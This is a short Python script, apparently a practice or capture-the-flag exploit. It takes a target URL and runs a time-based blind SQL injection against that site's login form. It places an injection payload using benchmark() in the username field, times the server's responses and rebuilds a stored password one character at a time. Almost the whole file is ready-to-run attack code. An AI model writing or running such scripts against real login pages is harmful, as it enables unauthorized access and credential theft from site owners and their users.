import requests
import time

def makeSession(url):
    session = requests.Session()
    try:
        # 타임아웃을 10초로 설정
        response = session.post(url, timeout=10)
        session_cookie = session.cookies.get_dict()
        return session_cookie
    except requests.exceptions.ConnectTimeout:
        return None

def SQLi(url):
    loginURL = f'{url}/login'
    password = ''
    
    for i in range(1, 29):
        for j in range(33, 127):
            session = makeSession(url) 
            if not session:
                print("Failed to create a session, skipping...")
                continue
            uid = f"' or if(ascii(substr(password,{i},1)) = {j}, benchmark(300000000,1),0) -- "
            data = {'username': uid, 'password': '1'}
            
            start_time = time.time()
            response = requests.post(loginURL, data=data, cookies=session, timeout=10) 
            end_time = time.time()
            response_time = end_time - start_time
            if response_time > 1.3:
                password += chr(j)
                print(f'[+] Found! {i}nd password is {chr(j)}')
                break

    print(f"[+] Password : {password}")

def main():
    url = input('[>] input Target URL : ')
    SQLi(url)

main()